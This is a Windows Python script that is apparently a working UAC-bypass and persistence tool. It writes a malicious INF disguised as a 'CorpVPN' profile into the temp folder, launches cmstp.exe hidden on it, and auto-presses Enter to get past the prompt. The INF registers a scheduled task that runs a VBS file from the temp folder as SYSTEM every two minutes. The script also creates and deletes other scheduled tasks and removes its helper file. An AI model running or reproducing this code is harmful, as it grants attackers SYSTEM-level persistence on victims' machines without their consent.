import os
import sys
import subprocess
import time
import ctypes

def restart_script():
    """restart."""
    print("pywin32 succ. ress...")
    time.sleep(2)
    os.execv(sys.executable, [sys.executable] + sys.argv)

def ensure_pywin32_installed():
    try:
        import win32con, win32gui, win32process
        return True
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pywin32"])
        python_dir = os.path.dirname(sys.executable)
        scripts_dir = os.path.join(python_dir, "Scripts")
        postinstall_script = os.path.join(scripts_dir, "pywin32_postinstall.py")

       
        if not os.path.isfile(postinstall_script):
            import site
            for dir in site.getsitepackages():
                alt_path = os.path.join(dir, "pywin32_postinstall.py")
                if os.path.isfile(alt_path):
                    postinstall_script = alt_path
                    break
            else:
                raise FileNotFoundError("pywin32_postinstall.py bulunamadı.")

        subprocess.check_call([sys.executable, postinstall_script, "-install"])
        return False

if not ensure_pywin32_installed():
    restart_script()

import win32con
import win32process

try:
    import psutil
except ImportError:
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'psutil'])
    import psutil

user32 = ctypes.windll.user32

WM_KEYDOWN = 0x0100
WM_KEYUP = 0x0101
VK_RETURN = 0x0D

def run_command(command, wait=True):
    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return result.returncode, result.stdout.decode(errors='replace'), result.stderr.decode(errors='replace')

def create_inf_file():
    temp_folder = os.getenv('TEMP')
    inf_content = f"""
    [version]
    Signature="$Windows NT$"
    AdvancedINF=2.5

    [DefaultInstall]
    CustomDestination=CustInstDestSectionAllUsers
    RunPreSetupCommands=RunPreSetupCommandsSection

    [RunPreSetupCommandsSection]
    ; Commands to run before setup begins
    taskkill /IM cmstp.exe /F
    cmd /c schtasks /create /tn "TempVBS" /tr "%temp%\\ddd.vbs" /sc minute /mo 2  /f /rl HIGHEST /ru SYSTEM

    [CustInstDestSectionAllUsers]
    49000,49001=AllUser_LDIDSection,7

    [AllUser_LDIDSection]
    "HKLM", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""

    [Strings]
    ServiceName="CorpVPN"
    ShortSvcName="CorpVPN"
    """

    inf_file_path = os.path.join(temp_folder, 'corpvpn.inf')
    with open(inf_file_path, 'w') as f:
        f.write(inf_content)

    return inf_file_path

def find_window_handle_by_process_name(proc_name):
    hwnds = []

    def enum_windows_proc(hwnd, lParam):
        pid = ctypes.c_ulong()
        user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
        try:
            proc = psutil.Process(pid.value)
            if proc.name().lower() == proc_name.lower():
                hwnds.append(hwnd)
        except Exception:
            pass
        return True

    EnumWindowsProc = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_int, ctypes.c_int)
    user32.EnumWindows(EnumWindowsProc(enum_windows_proc), 0)

    return hwnds[0] if hwnds else None

def send_enter(hwnd):
    user32.PostMessageW(hwnd, WM_KEYDOWN, VK_RETURN, 0)
    time.sleep(0.05)
    user32.PostMessageW(hwnd, WM_KEYUP, VK_RETURN, 0)

def run_cmstp_hidden(inf_path):
    startup_info = win32process.STARTUPINFO()
    startup_info.dwFlags |= win32process.STARTF_USESHOWWINDOW
    startup_info.wShowWindow = win32con.SW_HIDE
    cmd = f'cmstp.exe /au "{inf_path}"'
    return win32process.CreateProcess(None, cmd, None, None, False, 0, None, None, startup_info)

def main():
    
    run_command('schtasks /delete /tn "InstallRequests" /f')
    run_command('schtasks /delete /tn "RunPowerShellScript" /f')

   
    returncode, _, _ = run_command("python --version")
    if returncode != 0:
        sys.exit(1)

    
    temp_dir = os.getenv('TEMP')
    script_path = os.path.join(temp_dir, 'install_requests.py')
    with open(script_path, 'w') as script_file:
        script_file.write("import subprocess\n")
        script_file.write("subprocess.check_call(['python', '-m', 'pip', 'install', 'requests'])\n")

   
    returncode, _, stderr = run_command(f'schtasks /create /tn "InstallRequests" /tr "python {script_path}" /sc once /st 00:00 /f')
    if returncode != 0:
        
        sys.exit(1)

    
    run_command('schtasks /run /tn "InstallRequests"')

    
    time.sleep(10)

    
    try:
        os.remove(script_path)
    except Exception:
        pass

    
    inf_file_path = create_inf_file()

    
    proc_info = run_cmstp_hidden(inf_file_path)
    

    
    hwnd = None
    for _ in range(15):
        hwnd = find_window_handle_by_process_name('cmstp.exe')
        if hwnd:
            break
        time.sleep(1)

    if hwnd:
        send_enter(hwnd)
    else:
        pass

if __name__ == "__main__":
    main()
